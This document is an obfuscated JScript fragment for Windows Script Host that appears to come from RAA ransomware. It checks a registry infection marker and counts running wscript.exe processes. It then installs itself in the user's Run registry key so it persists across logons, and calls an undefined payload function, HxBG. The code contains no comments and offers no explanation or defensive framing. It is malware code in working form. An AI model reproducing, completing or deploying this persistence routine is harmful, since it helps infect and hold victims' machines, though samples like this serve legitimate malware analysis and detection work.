function zQqUzoSxLQ() {
    var QCY;
    var kHkyz = WScript.CreateObject("WScript.Shell");
    try {
        kHkyz.RegRead("HKCU\\RAA\\Raa-fnl\\");
    } catch (e) {
        QCY = 0;
    }
    var lCMTwJKZ = [];
    var baZk = "wscript.exe";
    var AFtKLHIjDtkM = 0;
    var e = new Enumerator(GetObject("winmgmts:").InstancesOf("Win32_process"));
    for (; !e.atEnd(); e.moveNext()) {
        var p = e.item();
        lCMTwJKZ = lCMTwJKZ + p.Name + ",";
    }
    lCMTwJKZ = lCMTwJKZ.split(",");
    var jcayrm = -1;
    do {
        jcayrm += 1;
        if (lCMTwJKZ[jcayrm] == baZk) {
            AFtKLHIjDtkM = AFtKLHIjDtkM + 1;
        } else {
            null
        }
    } while (jcayrm < lCMTwJKZ.length);
    if (AFtKLHIjDtkM < 2 && QCY == 0) {
        var TKVUdGUkzCmE = WScript.ScriptFullName;
        TKVUdGUkzCmE = TKVUdGUkzCmE + " argument";
        var qPOGRFfINeNb = WScript.CreateObject("WScript.Shell");
        qPOGRFfINeNb.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", TKVUdGUkzCmE, "REG_SZ");
        HxBG();
    } else {
        null;
    }
    return 0;
}
zQqUzoSxLQ();